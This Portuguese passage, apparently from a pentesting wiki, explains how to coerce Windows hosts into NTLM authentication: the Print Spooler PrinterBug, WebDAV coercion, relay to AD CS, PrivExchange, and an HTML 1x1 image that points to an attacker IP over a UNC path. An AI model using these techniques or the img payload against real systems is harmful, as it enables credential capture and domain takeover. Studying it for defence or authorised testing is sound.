...
Se o serviço _**Print Spooler**_ estiver **habilitado,** você pode usar algumas credenciais de AD já conhecidas para **solicitar** ao servidor de impressão do Domain Controller uma **atualização** sobre novos trabalhos de impressão e simplesmente dizer para ele **enviar a notificação para algum sistema**.\
...
Usando PowerShell, obtenha uma lista de máquinas Windows. Os servidores geralmente são prioritários, então vamos nos concentrar neles:
```bash
...
```
Isso é útil porque ver o endpoint no EPM apenas informa que a interface RPC de impressão está registrada. Isso **não** garante que todos os métodos de coercion possam ser acessados com seus privilégios atuais ou que o host emitirá um fluxo de autenticação utilizável.
...
O PrinterBug clássico geralmente resulta em uma autenticação **SMB** para `\\attacker\share`, que ainda é útil para **capture**, **relay para alvos HTTP** ou **relay onde a assinatura SMB está ausente**.\
No entanto, em ambientes modernos, fazer **relay de SMB para SMB** costuma ser bloqueado pela **assinatura SMB**, então os operadores geralmente preferem forçar a autenticação **HTTP/WebDAV**.

Se o serviço **WebClient** estiver em execução no alvo, o listener pode ser especificado de uma forma que faça o Windows usar **WebDAV sobre HTTP**:
```bash
...
- Observações: interface de impressão assíncrona no mesmo pipe do spooler; use o Coercer para enumerar métodos acessíveis em um determinado host<sup>[[1]](#references)[[6]](#references)</sup>
...
Observação: esses métodos aceitam parâmetros que podem conter um caminho UNC (por exemplo, `\\attacker\share`). Ao serem processados, o Windows se autenticará (no contexto de máquina/usuário) nesse UNC, permitindo a captura ou o relay de NetNTLM.\
Para o abuso do spooler, o **MS-RPRN opnum 65** continua sendo a primitiva mais comum e mais bem documentada, pois a especificação do protocolo afirma explicitamente que o servidor cria um canal de notificação de volta para o cliente especificado por `pszLocalMachine`.<sup>[[2]](#references)</sup>
...
- Uso prático: coagir ativos Tier 0 (DC/RODC/Citrix/etc.) a emitir NetNTLM e, em seguida, realizar relay para endpoints do AD CS (cenários ESC8/ESC11) ou outros serviços privilegiados.<sup>[[1]](#references)</sup>

## PrivExchange

O ataque `PrivExchange` resulta de uma falha encontrada no **recurso `PushSubscription` do Exchange Server**. Esse recurso permite que o Exchange server seja forçado, por qualquer usuário do domínio com uma mailbox, a se autenticar em qualquer host fornecido pelo cliente via HTTP.

Por padrão, o **serviço do Exchange é executado como SYSTEM** e recebe privilégios excessivos (especificamente, possui **privilégios WriteDacl no domínio antes da Cumulative Update de 2019**). Essa falha pode ser explorada para permitir o **relaying de informações para LDAP e, posteriormente, extrair o banco de dados NTDS do domínio**. Quando o relay para LDAP não é possível, essa falha ainda pode ser usada para realizar relay e autenticar-se em outros hosts dentro do domínio. A exploração bem-sucedida desse ataque concede acesso imediato ao Domain Admin com qualquer conta de usuário autenticada do domínio.
...
Se você souber o **email** do usuário que faz login em uma máquina que deseja comprometer, basta enviar a ele um **email com uma imagem de 1x1** como a seguinte:
```html
...
Se você conseguir realizar um ataque MitM contra um computador e injetar HTML em uma página que ele visualizar, poderá tentar injetar uma imagem como a seguinte na página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
